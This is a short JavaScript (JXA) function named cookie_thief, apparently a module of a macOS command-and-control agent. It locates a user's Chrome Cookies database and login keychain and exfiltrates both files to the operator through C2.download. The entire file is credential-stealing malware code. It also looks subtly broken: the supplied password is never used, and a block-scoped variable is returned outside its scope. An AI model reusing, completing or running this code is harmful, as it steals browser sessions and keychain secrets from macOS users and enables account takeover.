exports.cookie_thief = function(task, command, params){
    let config = JSON.parse(params);
    let password = "";
    var username = "";
    let browser = "chrome";
    let homedir = "/Users/";
    let keychainpath = "Library/Keychains/login.keychain-db"
    let chromeCookieDir = "Library/Application Support/Google/Chrome/Default/Cookies"
    let cookiedir = "Library/Application Support/Google/Chrome/Default/Cookies"

    if(config.hasOwnProperty("password") && typeof config['password'] == 'string'){
        password = config['password'];
    }
    else {
      return {'user_output': "Must supply a the user's login password", "completed": true, "status": "error"};
    }

    if(config.hasOwnProperty("username") && typeof config['username'] == 'string' && config['username']) {
        username = config['username'];
    }
    else {
        username = $.NSUserName().js;
    }
    cookiepath = homedir + username + "/";

    if(config.hasOwnProperty("browser") && typeof config['browser'] == 'string'){ browser = config['browser']; }
    if(browser == "chrome") {
        cookiedir = chromeCookieDir;
    }
    cookieDLPath = cookiepath + cookiedir;

    //DEBUG
    console.log(cookieDLPath)

    try{
        let cookieDL_status = C2.download(task, cookieDLPath);
    	  if(cookieDL_status.hasOwnProperty("file_id")){
    	      cookieDL_status['user_output'] = "Finished Downloading";
        }
    }
    catch(error)  {
        return {'user_output': error.toString(), "completed": true, "status": "error"};
    }

    keypath = homedir + username + "/" + keychainpath;
    try{
        let keyDL_status = C2.download(task, keypath);
    	  if(keyDL_status.hasOwnProperty("file_id")){
    	      keyDL_status['user_output'] = "Finished Downloading";
        }
    }
    catch(error)  {
        return {'user_output': error.toString(), "completed": true, "status": "error"};
    }
    return keyDL_status;
};
